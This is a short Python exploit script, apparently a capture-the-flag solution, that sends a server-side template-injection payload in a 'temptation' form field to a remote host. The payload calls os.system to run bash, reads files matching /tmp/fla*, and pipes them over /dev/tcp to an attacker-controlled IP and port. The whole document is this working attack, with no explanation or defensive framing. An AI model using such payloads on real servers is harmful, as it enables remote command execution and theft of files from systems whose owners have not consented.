url = "http://52.59.124.14:5011"  
# url = "http://localhost:8080"  
import requests  
ip = ~~~
port = ~~~
payload = f"""${__import__('os').system('bash -c "cat /tmp/fla* > /dev/tcp/{ip}/{port}"')}"""  

r = requests.post(url, data={"temptation": payload})  